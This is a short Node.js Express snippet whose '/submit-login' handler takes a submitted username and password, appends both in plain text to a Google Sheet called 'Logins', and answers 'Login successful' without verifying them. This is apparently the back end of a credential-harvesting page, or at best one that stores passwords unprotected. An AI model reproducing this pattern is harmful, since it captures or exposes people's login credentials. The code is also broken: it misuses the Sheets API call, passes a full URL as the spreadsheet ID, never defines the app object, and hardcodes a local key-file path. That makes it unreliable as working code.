const { google } = require('googleapis');
const sheets = google.sheets('Logins');

// Configuration
const SPREADSHEET_ID = 'https://docs.google.com/spreadsheets/d/18Wsw4rI7aJuOGT6Q6CLNdNTk8SiOUFeVw51UMK2LSGo/edit#gid=0';
const credentialsPath = 'C:/Users/ADMIN/Desktop/WEB/aqueous-freedom-403711-257429cdbabe.json';
const CREDENTIALS = require(credentialsPath);
// Initialize the Google Sheets API
const auth = new google.auth.JWT({
    email: CREDENTIALS.client_email,
    key: CREDENTIALS.private_key,
    scopes: ['https://www.googleapis.com/auth/spreadsheets'],
});

// Handle the form submission
app.post('/submit-login', (req, res) => {
    const { username, password } = req.body;

    // Append the data to the Google Sheets document
    sheets.spreadsheets.values.append({
        auth: auth,
        spreadsheetId: SPREADSHEET_ID,
        range: 'Logins', // Change this to the appropriate sheet and range
        valueInputOption: 'RAW',
        resource: {
            values: [[username, password]],
        },
    }, (err, response) => {
        if (err) {
            console.error(err);
            res.status(500).send('Error saving data to Google Sheets');
        } else {
            console.log('Data saved to Google Sheets');
            res.send('Login successful');
        }
    });
});
